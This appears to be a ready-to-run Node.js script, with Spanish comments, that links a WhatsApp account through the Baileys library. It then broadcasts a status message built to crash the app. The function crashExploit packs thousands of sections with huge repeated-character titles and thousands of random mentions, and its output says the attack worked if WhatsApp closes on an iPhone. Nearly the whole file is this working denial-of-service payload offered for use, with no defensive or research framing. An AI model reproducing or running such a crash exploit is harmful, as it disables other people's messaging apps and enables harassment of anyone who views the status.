const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const P = require("pino");
const readline = require("readline");

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

const ask = (q) => new Promise(res => rl.question(q, res));

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState("auth");
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        auth: state,
        version,
        logger: P({ level: "silent" }),
        browser: ["Ubuntu", "Chrome", "120.0.0"]
    });

    sock.ev.on("creds.update", saveCreds);

    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === "open") {
            console.log("\n✅ Conectado a WhatsApp\n");
            await crashExploit(sock);
        }
        if (connection === "close") {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log("🔄 Reconectando...");
                start();
            }
        }
    });

    if (!sock.authState.creds.registered) {
        const number = await ask("📱 Ingresa tu número (ej: 521234567890): ");
        try {
            const code = await sock.requestPairingCode(number);
            console.log("\n🔑 Código de vinculación:", code);
            console.log("📲 Abre WhatsApp > Dispositivos vinculados > Vincular con código de 8 dígitos\n");
        } catch (e) {
            console.log("❌ Error:", e.message);
        }
    }
}

async function crashExploit(sock) {
    // 1. Crear la lista masiva de opciones
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    // 2. Crear el mensaje malicioso
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "🌀" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: "status@broadcast",
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "〽"
                        }
                    },
                    description: "〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    // 3. Enviar el estado al broadcast
    const msg = generateWAMessageFromContent("status@broadcast", MSG, {});

    try {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: ["status@broadcast"],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: "status@broadcast" },
                        content: undefined
                    }]
                }]
            }]
        });
        console.log("\n💀 ¡Estado malicioso enviado! Abre WhatsApp en tu iPhone y ve al estado...");
        console.log("⚠️ Si la app se cierra, el exploit funcionó.");
    } catch (e) {
        console.log("❌ Error al enviar:", e.message);
    }
}

start();